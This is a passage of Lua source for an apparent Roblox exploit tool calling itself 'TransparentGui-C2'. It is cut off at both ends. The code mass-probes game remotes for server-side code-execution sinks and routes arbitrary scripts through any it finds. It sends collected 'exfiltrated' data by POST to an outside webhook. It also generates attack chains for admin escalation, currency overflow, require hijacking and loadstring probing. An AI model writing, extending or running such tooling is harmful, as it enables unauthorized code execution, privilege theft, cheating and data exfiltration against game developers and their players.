    local probeBtn = mBtn(hdr,0,(HDR_H-18)/2,82,18,
        Color3.fromRGB(255,60,80),1,10)
    probeBtn.Position = UDim2.new(1,-368,0,(HDR_H-18)/2)
    mS(probeBtn,Color3.fromRGB(255,60,80),0.45,1) mC(probeBtn,3)
    local probeLbl=mL(probeBtn,0,0,82,18,"** PROBE ALL",
        Enum.Font.GothamBold,7,Color3.fromRGB(255,60,80),
        Enum.TextXAlignment.Center,11)

    -- SCAN VMs button
    local vmBtn = mBtn(hdr,0,(HDR_H-18)/2,82,18,
        Color3.fromRGB(0,210,200),1,10)
    vmBtn.Position = UDim2.new(1,-280,0,(HDR_H-18)/2)
    mS(vmBtn,Color3.fromRGB(0,210,200),0.45,1) mC(vmBtn,3)
    local vmLbl=mL(vmBtn,0,0,82,18,"[search] SCAN VMs",
        Enum.Font.GothamBold,7,Color3.fromRGB(0,210,200),
        Enum.TextXAlignment.Center,11)
    vmBtn.MouseEnter:Connect(function()
        vmBtn.BackgroundColor3=Color3.fromRGB(0,210,200)
        vmBtn.BackgroundTransparency=0.82
    end)
    vmBtn.MouseLeave:Connect(function() vmBtn.BackgroundTransparency=1 end)
    vmBtn.MouseButton1Click:Connect(function()
        vmBtn.BackgroundTransparency=0.65
        task.delay(0.14,function() vmBtn.BackgroundTransparency=1 end)
        vmLbl.Text="SCANNING..."
        vmLbl.TextColor3=Color3.fromRGB(218,155,40)
        task.spawn(function()
            RCE:discoverAndProbeVMs(
                function(msg,col)
                    c2Log("VM",msg,col or Color3.fromRGB(0,210,200))
                end,
                function(found)
                    vmLbl.Text="[search] SCAN VMs"
                    vmLbl.TextColor3 = found
                        and Color3.fromRGB(255,60,80)
                        or  Color3.fromRGB(0,210,200)
                end
            )
        end)
    end)
    probeBtn.MouseEnter:Connect(function()
        probeBtn.BackgroundColor3=Color3.fromRGB(255,60,80)
        probeBtn.BackgroundTransparency=0.82
    end)
    probeBtn.MouseLeave:Connect(function() probeBtn.BackgroundTransparency=1 end)
    probeBtn.MouseButton1Click:Connect(function()
        probeBtn.BackgroundTransparency=0.65
        task.delay(0.14,function() probeBtn.BackgroundTransparency=1 end)
        -- Update probe button state during scan
        probeLbl.Text = "PROBING..."
        probeLbl.TextColor3 = Color3.fromRGB(218,155,40)
        task.spawn(function()
            RCE:massProbe(
                function(msg, col)
                    c2Log("RCE", msg, col or Color3.fromRGB(255,60,80))
                end,
                function(found)
                    if found then
                        probeLbl.Text = "[OK] SINK FOUND"
                        probeLbl.TextColor3 = Color3.fromRGB(255,60,80)
                        c2UpdateStatus("ACTIVE")
                        -- Update target label to show confirmed sink
                        if c2TargetLbl then
                            c2TargetLbl.Text = RCE.path:match("([^.]+)$") or RCE.path
                            c2TargetLbl.TextColor3 = Color3.fromRGB(255,60,80)
                        end
                    else
                        probeLbl.Text = "** PROBE ALL"
                        probeLbl.TextColor3 = Color3.fromRGB(255,60,80)
                    end
                end
            )
        end)
    end)

    -- -- Patch script console to route through confirmed sink -----------------
    -- The execScriptBtn callback was set earlier; replace it here now that
    -- rceExec is defined.
    if execScriptBtn then
        -- Disconnect previous connections by replacing via new button behaviour
        execScriptBtn.MouseButton1Click:Connect(function()
            local code = scriptBox and scriptBox.Text or ""
            if code == "" then c2Log("!","Script console empty.",C2_COL.ERR) return end
            execScriptBtn.BackgroundTransparency = 0.65
            task.delay(0.14, function() execScriptBtn.BackgroundTransparency = 1 end)
            if RCE.active then
                -- Route through confirmed execution sink
                c2Log("[->] RCE:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
                RCE:exec(code, function(ok, result)
                    if ok then
                        c2Log("[<-] RESULT", result:sub(1,80), C2_COL.IN)
                        HTTP:capture("SERVER_RESPONSES","exec_"..os.date("%H%M%S"),
                            { code=code, result=result, sink=RCE.path })
                    else
                        c2Log("!", result, C2_COL.ERR)
                    end
                end)
            else
                -- No confirmed sink -- fire through normal C2 target
                c2Log("[->] EXEC:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
                c2Send("EXEC:"..scriptType, { action="exec", type=scriptType, code=code })
            end
        end)
    end

    c2Log("SYS","C2 command hub ready.",C2_COL.SYS)
    c2Log("SYS","CONNECT to a Remote or Ingress node to begin.",C2_COL.SYS)
    c2Log("i","** PROBE ALL scans every discovered remote for execution sinks.",C2_COL.INFO)
    c2Log("i","If a sink is found, script console routes directly through it.",C2_COL.INFO)
    c2Log("i","Probe uses 6 payload formats: RAW_STRING, CODE_KEY, EXEC_KEY,",C2_COL.INFO)
    c2Log("i","ACTION_EVAL, ACTION_LOAD, EXPR_FIELD -- covers all common patterns.",C2_COL.INFO)
end


-- --- HTTP FEEDBACK PAGE ------------------------------------------------------
local function buildHttpFeedbackPage(page)
    page.ClipsDescendants = true

    local TRANS = 1
    local CR    = Color3.fromRGB(188,  40,  62)
    local GRN   = Color3.fromRGB(  0, 210, 110)
    local BLU   = Color3.fromRGB( 60, 155, 240)
    local AMB   = Color3.fromRGB(218, 155,  40)
    local DIM   = Color3.fromRGB( 55,  60,  80)
    local MID   = Color3.fromRGB(140, 150, 175)
    local PRI   = Color3.fromRGB(215, 220, 240)
    local SEP   = Color3.fromRGB( 32,  36,  52)
    local TREE_W = 240
    local HDR_H  = 28

    local function rule(parent, y, col, z)
        local f = mF(parent,0,y,0,1,col or SEP,0.50,z or 10)
        f.Size = UDim2.new(1,0,0,1) return f
    end

    -- -- PAGE HEADER --------------------------------------------------------
    local hdr = mF(page,0,0,0,HDR_H,Color3.new(0,0,0),TRANS,9)
    hdr.Size  = UDim2.new(1,0,0,HDR_H)
    mF(hdr,0,0,3,HDR_H,BLU,0.0,10)
    rule(hdr,HDR_H-1,BLU,10)
    mL(hdr,10,0,160,HDR_H,"HTTP FEEDBACK",
        Enum.Font.GothamBold,9,BLU,Enum.TextXAlignment.Left,10)
    local rHdr=mL(hdr,0,0,0,HDR_H,"OUTBOUND  .  EXFIL  .  RESPONSES",
        Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Right,10)
    rHdr.Size=UDim2.new(1,-10,1,0)

    -- -- LEFT PANE: FILE DIRECTORY ------------------------------------------
    local lp = mF(page,0,HDR_H,TREE_W,0,Color3.new(0,0,0),TRANS,9)
    lp.Size  = UDim2.new(0,TREE_W,1,-HDR_H)
    mF(lp,TREE_W-1,0,1,0,SEP,0.45,10).Size=UDim2.new(0,1,1,0)

    mL(lp,10,4,TREE_W-16,12,"FILE DIRECTORY",
        Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,10)
    rule(lp,18,SEP,10)

    local treeScroll = Instance.new("ScrollingFrame")
    treeScroll.Size                      = UDim2.new(1,0,1,-20)
    treeScroll.Position                  = UDim2.fromOffset(0,20)
    treeScroll.BackgroundTransparency    = 1
    treeScroll.BorderSizePixel           = 0
    treeScroll.ScrollBarThickness        = 2
    treeScroll.ScrollBarImageColor3      = BLU
    treeScroll.ScrollBarImageTransparency= 0.60
    treeScroll.CanvasSize                = UDim2.fromOffset(0,0)
    treeScroll.ZIndex                    = 10
    treeScroll.Parent                    = lp

    local CATEGORIES = {
        { id="EXFILTRATED",     label="EXFILTRATED",      col=CR  },
        { id="CHAIN_RESULTS",   label="CHAIN RESULTS",    col=GRN },
        { id="SERVER_RESPONSES",label="SERVER RESPONSES", col=AMB },
        { id="HTTP_REQUESTS",   label="HTTP REQUESTS",    col=BLU },
        { id="DISCOVERED",      label="DISCOVERED",       col=MID },
    }
    local folderExpanded = {}
    for _, cat in ipairs(CATEGORIES) do folderExpanded[cat.id] = true end

    local showDetail
    local function rebuildTree()
        for _, ch in ipairs(treeScroll:GetChildren()) do
            if ch:IsA("Frame") or ch:IsA("TextButton") then ch:Destroy() end
        end
        local ROW_H = 20
        local ITEM_H = 18
        local cy = 4
        for _, cat in ipairs(CATEGORIES) do
            local items = {}
            for _, item in ipairs(HTTP.exfilData) do
                if item.category == cat.id then table.insert(items, item) end
            end
            if cat.id == "HTTP_REQUESTS" then
                for _, h in ipairs(HTTP.feedHistory) do
                    table.insert(items, {
                        category  = "HTTP_REQUESTS",
                        name      = h.method.." "..h.status.." "..h.ts,
                        data      = {request=h.payload,response=h.response,
                                     status=h.status,ms=h.ms,url=h.url},
                        timestamp = h.ts,
                        id        = "http_"..h.ts,
                    })
                end
            end

            -- Folder row
            local exp   = folderExpanded[cat.id]
            local folderRow = mBtn(treeScroll,0,cy,TREE_W,ROW_H,
                Color3.new(0,0,0),TRANS,10)
            mF(folderRow,0,0,3,ROW_H,cat.col,0.0,11)
            mL(folderRow,6,0,14,ROW_H,exp and "v" or ">",
                Enum.Font.GothamBold,7,cat.col,Enum.TextXAlignment.Center,11)
            mL(folderRow,22,0,TREE_W-60,ROW_H,cat.label,
                Enum.Font.GothamBold,8,cat.col,Enum.TextXAlignment.Left,11)
            local cntBadge=mF(folderRow,TREE_W-32,(ROW_H-12)/2,28,12,cat.col,0.82,11)
            mC(cntBadge,4)
            mL(cntBadge,0,0,28,12,tostring(#items),
                Enum.Font.Code,7,Color3.new(0,0,0),Enum.TextXAlignment.Center,12)
            folderRow.MouseEnter:Connect(function()
                folderRow.BackgroundColor3=cat.col
                folderRow.BackgroundTransparency=0.90
            end)
            folderRow.MouseLeave:Connect(function()
                folderRow.BackgroundTransparency=TRANS
            end)
            local captCat=cat
            folderRow.MouseButton1Click:Connect(function()
                folderExpanded[captCat.id]=not folderExpanded[captCat.id]
                task.spawn(rebuildTree)
            end)
            cy = cy + ROW_H

            if exp then
                for _, item in ipairs(items) do
                    local iRow=mBtn(treeScroll,0,cy,TREE_W,ITEM_H,
                        Color3.new(0,0,0),TRANS,10)
                    local isSel=(HTTP.selectedItem==item.id)
                    if isSel then
                        iRow.BackgroundColor3=cat.col
                        iRow.BackgroundTransparency=0.88
                    end
                    local isLast=(item==items[#items])
                    mL(iRow,4,0,12,ITEM_H,isLast and "+" or "+",
                        Enum.Font.Code,8,Color3.fromRGB(45,50,70),
                        Enum.TextXAlignment.Center,11)
                    mF(iRow,9,0,1,isLast and ITEM_H/2 or ITEM_H,
                        Color3.fromRGB(45,50,70),0.0,11)
                    local tag=mF(iRow,14,(ITEM_H-10)/2,26,10,cat.col,0.82,11)
                    mC(tag,2)
                    mL(tag,0,0,26,10,"JSON",Enum.Font.Code,6,Color3.new(0,0,0),
                        Enum.TextXAlignment.Center,12)
                    mL(iRow,44,0,TREE_W-90,ITEM_H,item.name,
                        isSel and Enum.Font.GothamBold or Enum.Font.Gotham,
                        8,isSel and cat.col or MID,Enum.TextXAlignment.Left,11)
                    mL(iRow,0,0,TREE_W-4,ITEM_H,item.timestamp,
                        Enum.Font.Code,7,DIM,Enum.TextXAlignment.Right,11)
                    iRow.MouseEnter:Connect(function()
                        if not isSel then
                            iRow.BackgroundColor3=cat.col
                            iRow.BackgroundTransparency=0.92
                        end
                    end)
                    iRow.MouseLeave:Connect(function()
                        if not isSel then iRow.BackgroundTransparency=TRANS end
                    end)
                    local captItem=item
                    iRow.MouseButton1Click:Connect(function()
                        HTTP.selectedItem=captItem.id
                        task.spawn(rebuildTree)
                        if showDetail then showDetail(captItem) end
                    end)
                    cy = cy + ITEM_H
                end
            end
            cy = cy + 4
        end
        treeScroll.CanvasSize=UDim2.fromOffset(0,cy+8)
    end
    HTTP.treeRefresh=rebuildTree

    -- -- RIGHT PANE: HTTP/S CONTROL HUB ------------------------------------
    local rp=mF(page,TREE_W+1,HDR_H,0,0,Color3.new(0,0,0),TRANS,9)
    rp.Size=UDim2.new(1,-(TREE_W+1),1,-HDR_H)

    local rpHdr=mF(rp,0,0,0,24,Color3.new(0,0,0),TRANS,10)
    rpHdr.Size=UDim2.new(1,0,0,24)
    rule(rpHdr,23,SEP,11)
    mL(rpHdr,10,0,160,24,"HTTP/S CONTROL HUB",
        Enum.Font.GothamBold,8,BLU,Enum.TextXAlignment.Left,11)

    local cy2=28
    mL(rp,10,cy2,100,12,"OUTBOUND ENDPOINT",
        Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,10)
    mL(rp,0,cy2,0,12,"HTTPS/S",
        Enum.Font.Code,7,BLU,Enum.TextXAlignment.Right,10).Size=UDim2.new(1,-10,0,12)
    cy2=cy2+14

    local protoBadge=mF(rp,8,cy2,42,18,BLU,0.82,10)
    mC(protoBadge,3)
    mL(protoBadge,0,0,42,18,"HTTPS",Enum.Font.Code,7,
        Color3.new(0,0,0),Enum.TextXAlignment.Center,11)

    local rpUrlBox=Instance.new("TextBox")
    rpUrlBox.Size=UDim2.new(1,-58,0,18)
    rpUrlBox.Position=UDim2.fromOffset(54,cy2)
    rpUrlBox.BackgroundColor3=Color3.new(0,0,0)
    rpUrlBox.BackgroundTransparency=0.78 rpUrlBox.BorderSizePixel=0
    rpUrlBox.Text=HTTP.webhookUrl
    rpUrlBox.PlaceholderText="https://webhook.site/your-id  or  https://your-server/endpoint"
    rpUrlBox.PlaceholderColor3=DIM rpUrlBox.TextColor3=BLU
    rpUrlBox.Font=Enum.Font.Code rpUrlBox.TextSize=9
    rpUrlBox.ClearTextOnFocus=false rpUrlBox.TextXAlignment=Enum.TextXAlignment.Left
    rpUrlBox.ZIndex=10 rpUrlBox.Parent=rp
    mC(rpUrlBox,3) mS(rpUrlBox,BLU,0.60,1)
    rpUrlBox.FocusLost:Connect(function() HTTP.webhookUrl=rpUrlBox.Text end)
    rpUrlBox.Changed:Connect(function(p) if p=="Text" then HTTP.webhookUrl=rpUrlBox.Text end end)
    cy2=cy2+24

    -- Action buttons
    local BTN_H=32
    local function actionBtn(symbol,label,col,xOff,w,callback)
        local b=mBtn(rp,xOff,cy2,w,BTN_H,Color3.new(0,0,0),TRANS,10)
        mC(b,3)
        mF(b,0,0,w,2,col,0.0,11)
        mF(b,4,BTN_H-1,w-8,1,col,0.75,11)
        local symCirc=mF(b,6,(BTN_H-16)/2,16,16,col,0.82,11)
        mC(symCirc,8)
        mL(symCirc,0,0,16,16,symbol,Enum.Font.GothamBold,9,
            Color3.new(0,0,0),Enum.TextXAlignment.Center,12)
        mL(b,28,0,w-34,BTN_H,label,Enum.Font.GothamBold,7,col,
            Enum.TextXAlignment.Left,11)
        b.MouseEnter:Connect(function()
            TweenService:Create(b,TweenInfo.new(0.08),{
                BackgroundColor3=col,BackgroundTransparency=0.88}):Play()
        end)
        b.MouseLeave:Connect(function()
            TweenService:Create(b,TweenInfo.new(0.10),{BackgroundTransparency=TRANS}):Play()
        end)
        b.MouseButton1Click:Connect(function()
            TweenService:Create(b,TweenInfo.new(0.06),{BackgroundTransparency=0.60}):Play()
            task.delay(0.14,function()
                TweenService:Create(b,TweenInfo.new(0.10),{BackgroundTransparency=TRANS}):Play()
            end)
            task.spawn(callback)
        end)
    end
    -- Row 1: GET FETCH  |  POST TEST  |  EXFILTRATE ALL
    actionBtn("v","GET FETCH",GRN,8,115,function()
        if HTTP.webhookUrl=="" then return end
        local ok,status,body,ms=HTTP:get(HTTP.webhookUrl)
        HTTP:capture("HTTP_REQUESTS","get_"..os.date("%H%M%S"),
            {method="GET",url=HTTP.webhookUrl,status=status,ms=ms,response=body})
        HTTP:capture("SERVER_RESPONSES","get_response_"..os.date("%H%M%S"),
            {status=status,ms=ms,body=body})
        task.spawn(rebuildTree)
    end)
    actionBtn("o","POST TEST",BLU,129,110,function()
        if HTTP.webhookUrl=="" then return end
        local ok,status,body,ms=HTTP:post(HTTP.webhookUrl,{
            test=true, ts=os.date(), tool="TransparentGui-C2",
            placeId=tostring(game.PlaceId),
        })
        HTTP:capture("HTTP_REQUESTS","post_test_"..os.date("%H%M%S"),
            {method="POST",url=HTTP.webhookUrl,status=status,ms=ms,response=body})
        task.spawn(rebuildTree)
    end)
    actionBtn("^","EXFIL ALL",CR,245,118,function()
        local payload=HTTP:collect()
        HTTP:capture("EXFILTRATED","full_"..os.date("%H%M%S"),payload)
        if HTTP.webhookUrl~="" then
            local ok,status,body,ms=HTTP:post(HTTP.webhookUrl,payload)
            HTTP:capture("HTTP_REQUESTS","exfil_"..os.date("%H%M%S"),
                {method="POST",url=HTTP.webhookUrl,status=status,ms=ms,response=body})
        end
        task.spawn(rebuildTree)
    end)
    cy2=cy2+BTN_H+5

    -- Row 2: custom GET url  |  CLEAR
    local getUrlBox=Instance.new("TextBox")
    getUrlBox.Size=UDim2.new(1,-76,0,18)
    getUrlBox.Position=UDim2.fromOffset(8,cy2)
    getUrlBox.BackgroundColor3=Color3.new(0,0,0)
    getUrlBox.BackgroundTransparency=0.78 getUrlBox.BorderSizePixel=0
    getUrlBox.Text="" getUrlBox.PlaceholderText="Custom GET URL (optional -- defaults to endpoint above)"
    getUrlBox.PlaceholderColor3=Color3.fromRGB(55,60,80)
    getUrlBox.TextColor3=GRN getUrlBox.Font=Enum.Font.Code getUrlBox.TextSize=8
    getUrlBox.ClearTextOnFocus=false getUrlBox.TextXAlignment=Enum.TextXAlignment.Left
    getUrlBox.ZIndex=10 getUrlBox.Parent=rp
    mC(getUrlBox,3) mS(getUrlBox,GRN,0.60,1)

    local sendGetBtn=mBtn(rp,0,cy2,64,18,Color3.new(0,0,0),1,10)
    sendGetBtn.Position=UDim2.new(1,-70,0,cy2)
    mC(sendGetBtn,3) mS(sendGetBtn,GRN,0.50,1)
    mF(sendGetBtn,0,0,2,18,GRN,0.0,11)
    mL(sendGetBtn,6,0,56,18,"v  FETCH",Enum.Font.GothamBold,7,GRN,Enum.TextXAlignment.Left,11)
    sendGetBtn.MouseEnter:Connect(function()
        sendGetBtn.BackgroundColor3=GRN; sendGetBtn.BackgroundTransparency=0.82
    end)
    sendGetBtn.MouseLeave:Connect(function() sendGetBtn.BackgroundTransparency=1 end)
    sendGetBtn.MouseButton1Click:Connect(function()
        local target=getUrlBox.Text~="" and getUrlBox.Text or HTTP.webhookUrl
        if target=="" then return end
        task.spawn(function()
            local ok,status,body,ms=HTTP:get(target)
            HTTP:capture("SERVER_RESPONSES","fetch_"..os.date("%H%M%S"),
                {status=status,ms=ms,url=target,body=body})
            HTTP:capture("HTTP_REQUESTS","get_"..os.date("%H%M%S"),
                {method="GET",url=target,status=status,ms=ms,response=body})
            task.spawn(rebuildTree)
        end)
    end)
    cy2=cy2+24

    -- Clear history
    local clrHistBtn=mBtn(rp,8,cy2,100,18,Color3.new(0,0,0),1,10)
    mC(clrHistBtn,3) mS(clrHistBtn,Color3.fromRGB(55,60,80),0.60,1)
    mF(clrHistBtn,0,0,2,18,Color3.fromRGB(55,60,80),0.0,11)
    mL(clrHistBtn,6,0,92,18,"x  CLEAR HISTORY",Enum.Font.GothamBold,7,
        Color3.fromRGB(55,60,80),Enum.TextXAlignment.Left,11)
    clrHistBtn.MouseEnter:Connect(function()
        clrHistBtn.BackgroundColor3=Color3.fromRGB(55,60,80)
        clrHistBtn.BackgroundTransparency=0.80
    end)
    clrHistBtn.MouseLeave:Connect(function() clrHistBtn.BackgroundTransparency=1 end)
    clrHistBtn.MouseButton1Click:Connect(function()
        HTTP.feedHistory={} HTTP.exfilData={} HTTP.selectedItem=nil
        task.spawn(rebuildTree)
        if HTTP.detailRefresh then HTTP.detailRefresh(nil) end
    end)
    cy2=cy2+26

    -- Request log
    rule(rp,cy2,SEP,10) cy2=cy2+6
    mL(rp,10,cy2,120,11,"REQUEST LOG",
        Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,10)
    cy2=cy2+14
    local LOG_H=100
    local logSF=Instance.new("ScrollingFrame")
    logSF.Size=UDim2.new(1,-8,0,LOG_H)
    logSF.Position=UDim2.fromOffset(4,cy2)
    logSF.BackgroundTransparency=1 logSF.BorderSizePixel=0
    logSF.ScrollBarThickness=2
    logSF.ScrollBarImageColor3=BLU logSF.ScrollBarImageTransparency=0.60
    logSF.CanvasSize=UDim2.fromOffset(0,0) logSF.ZIndex=10 logSF.Parent=rp
    cy2=cy2+LOG_H+6

    local function rebuildLog()
        for _,ch in ipairs(logSF:GetChildren()) do
            if ch:IsA("TextLabel") then ch:Destroy() end
        end
        for i,h in ipairs(HTTP.feedHistory) do
            local col=h.status=="200" and GRN or CR
            local txt=string.format("[%s]  %s  %s  %dms  %s",
                h.ts,h.method,h.status,h.ms,h.url)
            local l=mL(logSF,4,(i-1)*14,0,14,txt,
                Enum.Font.Code,8,col,Enum.TextXAlignment.Left,11)
            l.Size=UDim2.new(1,-4,0,14)
        end
        local total=#HTTP.feedHistory*14
        logSF.CanvasSize=UDim2.fromOffset(0,total)
        logSF.CanvasPosition=Vector2.new(0,math.max(0,total-LOG_H))
    end

    -- Detail view
    rule(rp,cy2,SEP,10) cy2=cy2+6
    local detailHdrLbl=mL(rp,10,cy2,200,11,"SELECT A FILE TO VIEW",
        Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,10)
    cy2=cy2+14
    local detailSF=Instance.new("ScrollingFrame")
    detailSF.Size=UDim2.new(1,-8,1,-(cy2+8))
    detailSF.Position=UDim2.fromOffset(4,cy2)
    detailSF.BackgroundTransparency=1 detailSF.BorderSizePixel=0
    detailSF.ScrollBarThickness=2
    detailSF.ScrollBarImageColor3=BLU detailSF.ScrollBarImageTransparency=0.60
    detailSF.CanvasSize=UDim2.fromOffset(0,0) detailSF.ZIndex=10 detailSF.Parent=rp

    showDetail=function(item)
        for _,ch in ipairs(detailSF:GetChildren()) do ch:Destroy() end
        if not item then
            detailHdrLbl.Text="SELECT A FILE TO VIEW"
            detailSF.CanvasSize=UDim2.fromOffset(0,0) return
        end
        detailHdrLbl.Text=item.name.."  .  "..item.timestamp
        local ok,json=pcall(function()
            return game:GetService("HttpService"):JSONEncode(item.data)
        end)
        local raw=ok and json or tostring(item.data)
        local lines={}; local cur=""
        for i=1,#raw do
            local ch=raw:sub(i,i)
            if ch==","or ch=="{"or ch=="}"or ch=="["or ch=="]" then
                if cur~="" then table.insert(lines,cur); cur="" end
                table.insert(lines,ch)
            elseif ch=="\n" then
                if cur~="" then table.insert(lines,cur); cur="" end
            else
                cur=cur..ch
                if #cur>72 then table.insert(lines,cur); cur="" end
            end
        end
        if cur~="" then table.insert(lines,cur) end
        local LINE_H=13
        for i,line in ipairs(lines) do
            local col=MID
            if line:find('"status"') or line:find('"verdict"') then col=AMB
            elseif line:find('"response"') or line:find('"data"') then col=GRN
            elseif line:find('"error"') or line:find('"ERR"') then col=CR
            elseif line:sub(1,1)=="{"or line:sub(1,1)=="}" then col=DIM end
            local l=mL(detailSF,4,(i-1)*LINE_H,0,LINE_H,line,
                Enum.Font.Code,8,col,Enum.TextXAlignment.Left,11)
            l.Size=UDim2.new(1,-4,0,LINE_H)
        end
        detailSF.CanvasSize=UDim2.fromOffset(0,#lines*LINE_H)
    end
    HTTP.detailRefresh=showDetail

    -- Hook log rebuild into treeRefresh
    local origRefresh=HTTP.treeRefresh
    HTTP.treeRefresh=function()
        origRefresh() rebuildLog()
    end

    rebuildTree() rebuildLog()
end



-- ===============================================================================
-- AUTOMATED TRACE CHAIN GENERATOR
-- Generates pre-built S->S and HPDC chains from live remote scans.
-- Each "generation set" is a fully configured graph (nodes + wires + actions).
-- User cycles through sets and applies/dumps them without rebuilding manually.
-- ===============================================================================
HTTP.gen = {
    sets       = {},   -- { {tab, strategy, desc, nodes, wires}, ... }
    current    = 1,
    dumped     = {},   -- set indices marked as failed
    switcherFrm= nil,  -- switcher UI frame ref
    genLbl     = nil,
    stratLbl   = nil,
    descLbl    = nil,
}

-- Classify a remote name into a functional category
function HTTP.gen:classify(name)
    local n = name:lower()
    if n:find("exec") or n:find("eval") or n:find("run") or n:find("script")
    or n:find("code") or n:find("vm") or n:find("load") then
        return "EXEC", 1
    elseif n:find("admin") or n:find("role") or n:find("rank") or n:find("perm")
    or n:find("owner") or n:find("mod") then
        return "ADMIN", 2
    elseif n:find("buy") or n:find("shop") or n:find("currenc") or n:find("gold")
    or n:find("cash") or n:find("coin") or n:find("money") or n:find("gem") then
        return "ECONOMY", 3
    elseif n:find("data") or n:find("save") or n:find("store") or n:find("stat") then
        return "DATASTORE", 4
    elseif n:find("gui") or n:find("screen") or n:find("ui") or n:find("open")
    or n:find("show") or n:find("menu") then
        return "GUI", 5
    elseif n:find("chat") or n:find("msg") or n:find("say") or n:find("message") then
        return "CHAT", 6
    elseif n:find("kill") or n:find("die") or n:find("damage") or n:find("health")
    or n:find("combat") or n:find("respawn") then
        return "COMBAT", 7
    else
        return "GENERAL", 8
    end
end

-- Gather all discoverable remotes and bindables, classified
function HTTP.gen:scanAll()
    local remotes   = {}
    local bindables = {}
    local roots = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        workspace,
    }
    for _, root in ipairs(roots) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, inst in ipairs(descs) do
                local cls = inst.ClassName
                local cat, pri = HTTP.gen:classify(inst.Name)
                local entry = {
                    inst = inst,
                    name = inst.Name,
                    path = instancePath(inst),
                    cls  = cls,
                    cat  = cat,
                    pri  = pri,
                }
                if cls == "RemoteFunction" or cls == "RemoteEvent" then
                    table.insert(remotes, entry)
                elseif cls == "BindableEvent" or cls == "BindableFunction" then
                    table.insert(bindables, entry)
                end
            end
        end
    end
    -- Sort by category priority (EXEC first, then ADMIN, etc.)
    table.sort(remotes,   function(a,b) return a.pri < b.pri end)
    table.sort(bindables, function(a,b) return a.pri < b.pri end)
    return remotes, bindables
end

-- -- S->S CHAIN TEMPLATES ------------------------------------------------------
-- Each template: { strategy, desc, builder(remotes, bindables, idx) -> nodeList }
-- nodeList: { {typeId, actionIdx, x, y, value, remotePath} }
-- typeId matches NODE_TYPES[i].id

HTTP.gen.ssTemplates = {
    {
        strategy = "EXEC PATH",
        desc     = "Routes exec payload through highest-priority exec/eval remote",
        build    = function(rem, bind, idx)
            local target = nil
            for _, r in ipairs(rem) do
                if r.cat == "EXEC" then target = r; break end
            end
            target = target or rem[((idx-1) % #rem)+1]
            return {
                { id="INPUT",  ai=2, x=30,  y=90,  val="return 59483+20394" },
                { id="REMOTE", ai=2, x=210, y=90,  path=target and target.path or "" },
                { id="HTTP",   ai=1, x=390, y=90,  val="" },
            }, {{1,2},{2,3}}
        end,
    },
    {
        strategy = "ADMIN ESCALATION",
        desc     = "Chains through admin-adjacent remotes for privilege escalation",
        build    = function(rem, bind, idx)
            local admin = nil
            local general = nil
            for _, r in ipairs(rem) do
                if r.cat == "ADMIN" and not admin then admin = r end
                if r.cat == "GENERAL" and not general then general = r end
            end
            return {
                { id="INPUT",   ai=1, x=30,  y=90,  val="{action='grantAdmin',level='owner'}" },
                { id="REMOTE",  ai=2, x=200, y=90,  path=admin and admin.path or (rem[1] and rem[1].path or "") },
                { id="SERVICE", ai=2, x=370, y=90,  val="" },
            }, {{1,2},{2,3}}
        end,
    },
    {
        strategy = "LOADSTRING PROBE",
        desc     = "Tests each remote for native loadstring availability",
        build    = function(rem, bind, idx)
            local target = rem[((idx-1) % math.max(#rem,1))+1]
            return {
                { id="INPUT",  ai=2, x=30,  y=90,  val="return 59483+20394" },
                { id="REMOTE", ai=2, x=200, y=90,  path=target and target.path or "" },
                { id="BINDABLE",ai=2,x=370, y=90,  val="" },
            }, {{1,2},{2,3}}
        end,
    },
    {
        strategy = "ECONOMY OVERFLOW",
        desc     = "Sends overflowed amounts through economy remotes",
        build    = function(rem, bind, idx)
            local eco = nil
            for _, r in ipairs(rem) do
                if r.cat == "ECONOMY" then eco = r; break end
            end
            eco = eco or rem[((idx-1) % math.max(#rem,1))+1]
            return {
                { id="INPUT",   ai=2, x=30,  y=90,  val="{currency='Gold',amount=2147483647}" },
                { id="REMOTE",  ai=2, x=200, y=90,  path=eco and eco.path or "" },
                { id="SERVICE", ai=4, x=370, y=90,  val="" },
            }, {{1,2},{2,3}}
        end,
    },
    {
        strategy = "BINDABLE BRIDGE",
        desc     = "Routes payload through a bindable before the remote sink",
        build    = function(rem, bind, idx)
            local bnd = bind[((idx-1) % math.max(#bind,1))+1]
            local tgt = rem[((idx-1) % math.max(#rem,1))+1]
            return {
                { id="INPUT",    ai=2, x=30,  y=90, val="return 59483+20394" },
                { id="BINDABLE", ai=1, x=190, y=90, path=bnd and bnd.path or "" },
                { id="REMOTE",   ai=2, x=350, y=90, path=tgt and tgt.path or "" },
                { id="HTTP",     ai=1, x=510, y=90, val="" },
            }, {{1,2},{2,3},{3,4}}
        end,
    },
    {
        strategy = "REQUIRE HIJACK",
        desc     = "Chains through a dynamic require path for arbitrary module load",
        build    = function(rem, bind, idx)
            local tgt = rem[((idx-1) % math.max(#rem,1))+1]
            return {
                { id="INPUT",   ai=2, x=30,  y=90, val="return 59483+20394" },
                { id="REMOTE",  ai=2, x=200, y=90, path=tgt and tgt.path or "" },
                { id="REQUIRE", ai=1, x=370, y=90, val="" },
                { id="HTTP",    ai=1, x=540, y=90, val="" },
            }, {{1,2},{2,3},{3,4}}
        end,
    },
    {
        strategy = "BROADCAST CHAIN",
        desc     = "Targets RemoteEvent broadcast path to reach all server handlers",
        build    = function(rem, bind, idx)
            local evt = nil
            for _, r in ipairs(rem) do
                if r.cls == "RemoteEvent" then evt = r; break end
            end
            evt = evt or rem[1]
            return {
                { id="INPUT",    ai=2, x=30,  y=90, val="{broadcast=true,code='return 59483+20394'}" },
                { id="REMOTE",   ai=1, x=200, y=90, path=evt and evt.path or "" },
                { id="BINDABLE", ai=1, x=370, y=90, val="" },
            }, {{1,2},{2,3}}
        end,
    },
    {
        strategy = "BLIND COVERAGE",
        desc     = "Cycles through all remotes sequentially for broad coverage",
        build    = function(rem, bind, idx)
            local tgt = rem[((idx-1) % math.max(#rem,1))+1]
            local nxt = rem[(idx % math.max(#rem,1))+1] or tgt
            return {
                { id="INPUT",  ai=2, x=30,  y=90, val="return 59483+20394" },
